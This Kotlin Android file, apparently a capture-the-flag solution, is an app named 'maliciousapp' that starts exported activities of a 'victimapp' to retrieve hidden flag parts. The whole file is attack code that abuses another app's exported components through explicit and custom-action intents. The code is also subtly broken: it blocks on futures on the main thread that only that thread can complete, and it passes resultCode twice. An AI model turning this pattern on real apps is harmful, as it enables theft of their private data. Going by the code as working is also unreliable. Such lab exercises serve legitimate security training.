package com.example.maliciousapp

import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.app.Activity
import android.content.Intent
import android.content.ComponentName
import android.widget.TextView
import java.util.concurrent.CompletableFuture

class MainActivity : AppCompatActivity() {
    val flagParts = HashMap<Int, CompletableFuture<String>>().apply {
        put(1, CompletableFuture<String>())
        put(2, CompletableFuture<String>())
        put(3, CompletableFuture<String>())
        put(4, CompletableFuture<String>())
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        val view = findViewById<TextView>(R.id.debug_text)

        // PartOne
        val intent = Intent().apply {
            component = ComponentName(
                "com.example.victimapp",
                "com.example.victimapp.PartOne"
            )
        }
        startActivityForResult(intent, 1)

        // PartTwo
        val sendIntent: Intent = Intent().apply {
            action = "com.example.victimapp.intent.action.JUSTASK"
        }
        startActivityForResult(sendIntent, 2)

        var flag = ""
        for (i in 1..2) {
            flag += flagParts[i]?.get() + "\n"
        }
        view.text = flag
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, intent: Intent?) {
        super.onActivityResult(resultCode, resultCode, intent)

        val view = findViewById<TextView>(R.id.debug_text)
        intent?.getExtras()?.let { extras ->
            val flagPart = extras
                .keySet()
                .fold("") { acc, key -> acc + extras.getCharSequence(key) }
            flagParts[requestCode]?.complete(flagPart)
        }
    }
}
